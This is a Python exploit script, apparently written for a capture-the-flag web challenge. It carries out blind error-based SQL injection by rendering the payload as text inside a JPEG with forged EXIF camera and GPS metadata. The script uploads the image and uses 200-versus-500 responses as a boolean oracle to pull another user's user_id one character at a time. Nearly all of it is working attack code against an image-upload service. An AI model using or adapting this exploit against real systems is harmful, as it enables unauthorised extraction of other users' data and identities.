# v2_extract.py — CASE WHEN executes (200). Build a boolean ORACLE: TRUE -> valid (200),
# FALSE -> error (500). Use: CASE WHEN (<cond>) THEN 65 ELSE (SELECT 65 UNION SELECT 66) END
# (a scalar subquery returning >1 row errors) OR abs(-9223372036854775808) overflow. We'll use
# a subquery-too-many-rows for the FALSE branch to force 500.
# Then extract the victim's user_id char by char via substr comparisons.
import requests, base64, re, string, time
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")
CNT=[0]

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=30):
    W=min(2000,max(1000,40+int(len(text)*size*0.56))); H=260
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save("ex.jpg","jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"ex.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("ex.jpg","rb").read()).decode()

q="'"
def oracle(cond):
    # TRUE -> 65 (ok, 200). FALSE -> (SELECT 1 UNION SELECT 2) scalar with 2 rows -> error -> 500
    CNT[0]+=1
    payload = "9"+q+"||(CASE WHEN ("+cond+") THEN 65 ELSE (SELECT 1 UNION SELECT 2) END)||"+q+"9"
    r=requests.post(f"{BASE}/upload", json={"image":build(payload),"description":f"EX{CNT[0]}","user_id":UID})
    return r.status_code==200   # True => condition TRUE

# STEP 1: verify oracle direction with known true/false
print("oracle(1=1):", oracle("1=1"), " (expect True)")
print("oracle(1=2):", oracle("1=2"), " (expect False)")
print("If those are True/False, the oracle works. Then we extract.\n")

# victim = the user_id that's not ours
VIC = "(SELECT user_id FROM images WHERE user_id!="+q+UID+q+" LIMIT 1)"
# but our uuid contains no quotes issue; it's inside the painted text as plain chars -> fine? The
# uuid has digits/letters/hyphens, OCR-friendly. Test length first.
def get_char(pos):
    # binary search over hex+hyphen charset via substr(VIC,pos,1)
    charset = "0123456789abcdef-"
    for ch in charset:
        if oracle("substr("+VIC+","+str(pos)+",1)="+q+ch+q):
            return ch
    return "?"

# Only run a few positions as a proof; full uuid is 36 chars.
if True:
    print("extracting victim user_id (first chars)...")
    got=""
    for pos in range(1, 37):
        c = get_char(pos)
        got += c
        print(f"  pos {pos:2}: {c}   -> {got}")
        if c=="?" and pos>1:
            break
    print("\nVICTIM user_id:", got)
